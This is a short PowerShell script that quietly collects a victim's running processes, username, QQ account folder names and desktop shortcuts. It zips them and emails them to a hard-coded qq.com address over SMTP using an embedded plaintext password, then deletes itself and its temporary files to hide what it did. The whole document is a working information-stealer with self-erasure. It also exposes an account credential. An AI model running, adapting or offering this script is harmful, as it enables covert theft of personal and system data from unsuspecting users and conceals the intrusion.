get-process >> 'process.txt'
$whoami = whoami
(dir "$home\Documents\Tencent Files").Name >> 'qq.txt'

$data = dir "$home\Desktop" -filter *.lnk -recurse
$data | Foreach-Object{
	Compress-Archive -Update -Path $_.FullName -DestinationPath bakcup.zip
}



$smtpServer = "smtp.qq.com"
$smtpUser = "hk_snow@qq.com"
$smtpPassword = "vnkaewsoxhjkeafg"
#create the mail message
$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
$MailAddress="hk_snow@qq.com"
$MailtoAddress="hk_snow@qq.com"
$mail.From = New-Object System.Net.Mail.MailAddress($MailAddress)
$mail.To.Add($MailtoAddress)
#set the content
$mail.Subject = $whoami;
$mail.Priority = "High"
$mail.Body = $process
$filename="bakcup.zip"	#add file
$attachment = new-Object System.Net.Mail.Attachment($filename)
$mail.Attachments.Add($attachment)

$filename1="process.txt"	#add file
$attachment1 = new-Object System.Net.Mail.Attachment($filename1)
$mail.Attachments.Add($attachment1)

$filename2="qq.txt"	#add file
$attachment1 = new-Object System.Net.Mail.Attachment($filename2)
$mail.Attachments.Add($attachment2)

#send the message
$smtp = New-Object System.Net.Mail.SmtpClient -argumentList $smtpServer
$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList $smtpUser,$smtpPassword
$smtp.Send($mail)
$mail.Attachments.Dispose()
remove-item $MyInvocation.MyCommand.Path -force
remove-item 'bakcup.zip'
remove-item 'process.txt'
remove-item 'qq.txt'
